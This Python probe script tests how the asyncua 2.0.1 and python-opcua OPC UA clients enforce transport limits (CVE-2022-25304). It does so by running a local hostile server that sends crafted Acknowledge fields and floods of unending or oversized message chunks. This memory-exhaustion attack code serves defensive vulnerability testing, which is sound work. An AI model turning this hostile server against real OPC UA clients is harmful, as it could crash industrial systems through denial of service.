# ruff: noqa: SIM105
"""Transport limits in asyncua 2.0.1, against a hostile server (CVE-2022-25304).

The hostile server is a raw OPC UA TCP listener in this process. It answers the
client's Hello with an Acknowledge whose fields this probe chooses, then, while
the client waits for its OpenSecureChannel response, streams SecurityPolicy
None MSG chunks that never end. Those reach exactly the code a real response
reaches: UASocketProtocol.data_received -> SecureConnection._receive. The probe
reads the client's own reassembly list to see how many chunks it held.

    uv run --no-sync --with asyncua==2.0.1 python docs/asyncua-spike/probe_transport_limits.py
"""

from __future__ import annotations

import asyncio
import inspect
import logging
import struct
import time

from _common import report
from asyncua import Client, ua
from asyncua.common import connection as ua_connection
from asyncua.common.utils import Buffer
from asyncua.ua.ua_binary import struct_from_binary, uatcp_to_binary

logging.disable(logging.CRITICAL)

CONTRACT_MAX_CHUNKS = 1024
CONTRACT_MAX_MESSAGE = 64 * 1024 * 1024


def msg_chunk(sequence: int, body: bytes, final: bool = False) -> bytes:
    """One SecurityPolicy None MSG chunk on channel 0, token 0, request 1."""
    payload = struct.pack("<III", 0, sequence, 1) + body  # TokenId, SequenceNumber, RequestId
    size = 12 + len(payload)
    return b"MSG" + (b"F" if final else b"C") + struct.pack("<II", size, 0) + payload


class Hostile:
    def __init__(self, ack: dict, chunks: int, chunk_body: int, single: int = 0):
        self.ack, self.chunks, self.chunk_body, self.single = ack, chunks, chunk_body, single
        self.hello: ua.Hello | None = None
        self.sent = 0
        self.done = asyncio.Event()

    async def handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        try:
            header = await reader.readexactly(8)
            size = struct.unpack("<I", header[4:8])[0]
            self.hello = struct_from_binary(ua.Hello, Buffer(await reader.readexactly(size - 8)))
            ack = ua.Acknowledge()
            for field, value in self.ack.items():
                setattr(ack, field, value)
            writer.write(uatcp_to_binary(ua.MessageType.Acknowledge, ack))
            await writer.drain()
            header = await reader.readexactly(8)  # the OpenSecureChannel request
            await reader.readexactly(struct.unpack("<I", header[4:8])[0] - 8)
            if self.single:
                writer.write(msg_chunk(1, b"\0" * self.single))
                await writer.drain()
                self.sent = 1
            for sequence in range(1, self.chunks + 1):
                writer.write(msg_chunk(sequence, b"\0" * self.chunk_body))
                self.sent = sequence
                if sequence % 64 == 0:
                    await writer.drain()
            await writer.drain()
        except (ConnectionError, asyncio.IncompleteReadError):
            pass
        finally:
            await asyncio.sleep(1.0)
            self.done.set()
            writer.close()


async def attack(ack: dict, chunks: int = 0, chunk_body: int = 16, single: int = 0, advertise=True):
    """Run one attack; return (hello, chunks the client held at peak, error, seconds)."""
    hostile = Hostile(ack, chunks, chunk_body, single)
    server = await asyncio.start_server(hostile.handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    peak = {"parts": 0, "bytes": 0, "error": None}
    original = ua_connection.SecureConnection._receive

    def spy(self, msg):
        try:
            result = original(self, msg)
        except Exception as error:
            peak["error"] = peak["error"] or f"{type(error).__name__}: {error}"
            raise
        held = self._incoming_parts
        peak["parts"] = max(peak["parts"], len(held))
        peak["bytes"] = max(peak["bytes"], sum(len(part.Body) for part in held))
        return result

    ua_connection.SecureConnection._receive = spy
    client = Client(f"opc.tcp://127.0.0.1:{port}", timeout=20)
    if advertise:  # what transport_limits.advertise_limits does today
        client.max_chunkcount = CONTRACT_MAX_CHUNKS
        client.max_messagesize = CONTRACT_MAX_MESSAGE
    started = time.monotonic()
    connect = asyncio.create_task(client.connect())
    try:
        await asyncio.wait_for(hostile.done.wait(), 120)
    finally:
        connect.cancel()
        try:
            await connect
        except BaseException:
            pass
        ua_connection.SecureConnection._receive = original
        server.close()
    return hostile, peak, time.monotonic() - started


async def main() -> None:
    # 1. Source facts, read off the installed library rather than recalled.
    protocol_src = inspect.getsource(ua_connection.TransportLimits)
    from asyncua.client import ua_client

    make_protocol = inspect.getsource(ua_client.UaClient._make_protocol)
    defaults = inspect.getsource(ua_client.UASocketProtocol.__init__)
    report(
        "note",
        "transport.client-default",
        "UASocketProtocol builds TransportLimits(65535, 65535, 0, 0) when given none "
        f"({'TransportLimits(65535, 65535, 0, 0)' in defaults}), and UaClient._make_protocol "
        f"passes none ({'limits' not in make_protocol}): chunk count and message size are "
        "unlimited until the server's Acknowledge says otherwise",
    )
    hello = ua_connection.TransportLimits(65535, 65535, 7, 999_999).create_hello_limits(ua.Hello())
    report(
        "bug",
        "transport.create-hello-limits",
        f"TransportLimits(max_chunk_count=7, max_message_size=999999).create_hello_limits() "
        f"-> MaxMessageSize={hello.MaxMessageSize}, MaxChunkCount={hello.MaxChunkCount} "
        f"(MaxMessageSize copied from max_chunk_count). No caller in the client path "
        f"(Client.connect sends Client.max_messagesize/max_chunkcount via send_hello), so dead "
        f"code today, a trap for anyone wiring TransportLimits in",
    )
    enforced = "is_msg_size_within_limit" in inspect.getsource(
        ua_connection.SecureConnection._receive
    )
    report(
        "bug" if not enforced else "supported",
        "transport.max-message-size-on-receive",
        f"SecureConnection._receive calls is_msg_size_within_limit: {enforced}; "
        f"only packet_size vs max_recv_buffer and chunk count are checked",
    )
    assert "max_recv_buffer = msg.ReceiveBufferSize" in protocol_src

    # 2. What the client actually advertises, with and without advertise_limits.
    for advertise in (False, True):
        hostile, _, _ = await attack({"MaxChunkCount": 1024}, advertise=advertise)
        h = hostile.hello
        report(
            "note",
            f"transport.hello{'-advertised' if advertise else '-default'}",
            f"Hello ReceiveBufferSize={h.ReceiveBufferSize} SendBufferSize={h.SendBufferSize} "
            f"MaxMessageSize={h.MaxMessageSize} MaxChunkCount={h.MaxChunkCount}",
        )

    # 3. A conforming Acknowledge: the chunk cap is enforced, at the server's number.
    honest = {"ReceiveBufferSize": 65535, "SendBufferSize": 65535, "MaxChunkCount": 1024,
              "MaxMessageSize": CONTRACT_MAX_MESSAGE}  # fmt: skip
    _, peak, _ = await attack(honest, chunks=1500)
    report(
        "supported" if peak["parts"] <= 1024 and peak["error"] else "bug",
        "transport.chunk-cap-honest-ack",
        f"Ack MaxChunkCount=1024, 1500 chunks streamed: client held at most {peak['parts']}, "
        f"then {peak['error']}",
    )

    # 4. Ack MaxChunkCount=0 ("no limit"): the client's own advertised 1024 is discarded.
    hostile_ack = {**honest, "MaxChunkCount": 0, "MaxMessageSize": 0}
    _, peak, _ = await attack(hostile_ack, chunks=5000)
    report(
        "bug" if peak["parts"] > CONTRACT_MAX_CHUNKS else "supported",
        "transport.ack-overwrites-chunk-cap",
        f"client advertised MaxChunkCount=1024; server Ack MaxChunkCount=0; 5000 chunks "
        f"streamed: client held {peak['parts']} chunks, error={peak['error']} "
        f"(CVE-2022-25304 reopened by one Ack field)",
    )

    # 5. Ack larger than the client asked for: widened, not narrowed.
    _, peak, _ = await attack({**honest, "MaxChunkCount": 100_000}, chunks=3000)
    report(
        "bug" if peak["parts"] > CONTRACT_MAX_CHUNKS else "supported",
        "transport.ack-widens-chunk-cap",
        f"client advertised 1024; Ack MaxChunkCount=100000; client held {peak['parts']} of "
        f"3000 chunks, error={peak['error']}",
    )

    # 6. MaxMessageSize: Ack says 100 kB, 1000 chunks of 1 kB arrive, nothing objects.
    _, peak, _ = await attack({**honest, "MaxMessageSize": 100_000}, chunks=1000, chunk_body=1000)
    report(
        "bug" if peak["bytes"] > 100_000 else "supported",
        "transport.max-message-size-ignored",
        f"Ack MaxMessageSize=100000: client held {peak['bytes']} body bytes in "
        f"{peak['parts']} chunks, error={peak['error']}",
    )

    # 7. Chunk size: the cap is Ack.ReceiveBufferSize (the *server's* receive buffer).
    big = 8 * 1024 * 1024
    _, peak, seconds = await attack({**honest, "ReceiveBufferSize": 0x7FFFFFFF}, single=big)
    report(
        "bug" if peak["bytes"] >= big else "supported",
        "transport.ack-receivebuffer-sets-chunk-cap",
        f"Ack ReceiveBufferSize=2^31-1 (the server's own receive size, which bounds what the "
        f"client may *send*): one {big} byte chunk accepted, held={peak['bytes']} bytes, "
        f"error={peak['error']}, {seconds:.1f}s",
    )
    _, peak, seconds = await attack(honest, single=big)
    report(
        "bug",
        "transport.oversize-chunk-buffered-first",
        f"Ack ReceiveBufferSize=65535, one {big} byte chunk: refused ({peak['error']}) only "
        f"after the whole chunk was buffered by data_received (receive_buffer grows to "
        f"packet_size, up to 4 GiB, by repeated bytes concatenation), {seconds:.1f}s",
    )

    # 8. Baseline: what the Python runtime enforces today, python-opcua 0.98.13 with
    #    transport_limits.install_receive_guard() and advertise_limits() applied.
    peak = await legacy_attack({**honest, "MaxChunkCount": 0}, chunks=3000)
    report(
        "supported" if peak["parts"] <= CONTRACT_MAX_CHUNKS else "bug",
        "transport.baseline-python-opcua-chunks",
        f"python-opcua + the runtime's guard, Ack MaxChunkCount=0, 3000 chunks: held at "
        f"most {peak['parts']}, then {peak['error']}",
    )
    peak = await legacy_attack({**honest, "MaxChunkCount": 0}, single=big)
    report(
        "bug" if peak["bytes"] >= big else "supported",
        "transport.baseline-python-opcua-chunk-size",
        f"python-opcua + the runtime's guard, one {big} byte chunk: held {peak['bytes']} bytes, "
        f"error={peak['error']}. The guard counts chunks only; neither maxChunkSize nor "
        f"maxMessageSize from contract/tools.json -> transport is enforced on Python today",
    )


async def legacy_attack(ack: dict, chunks: int = 0, chunk_body: int = 16, single: int = 0):
    """The same attack against python-opcua with the runtime's own mitigation installed."""
    from opcua import Client as LegacyClient
    from opcua.common import connection as legacy_connection
    from opcua_mcp_server.transport_limits import advertise_limits, install_receive_guard

    install_receive_guard()
    hostile = Hostile(ack, chunks, chunk_body, single)
    server = await asyncio.start_server(hostile.handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    peak = {"parts": 0, "bytes": 0, "error": None}
    guarded = legacy_connection.SecureConnection._receive

    def spy(self, msg):
        try:
            result = guarded(self, msg)
        except Exception as error:
            peak["error"] = peak["error"] or f"{type(error).__name__}: {str(error)[:110]}"
            raise
        held = self._incoming_parts
        peak["parts"] = max(peak["parts"], len(held))
        peak["bytes"] = max(peak["bytes"], sum(len(part.Body) for part in held))
        return result

    legacy_connection.SecureConnection._receive = spy
    client = LegacyClient(f"opc.tcp://127.0.0.1:{port}", timeout=5)
    advertise_limits(client)
    connect = asyncio.create_task(asyncio.to_thread(client.connect))
    try:
        await asyncio.wait_for(hostile.done.wait(), 120)
        await asyncio.wait_for(asyncio.shield(connect), 15)
    except BaseException:
        pass
    finally:
        legacy_connection.SecureConnection._receive = guarded
        server.close()
    return peak


asyncio.run(main())
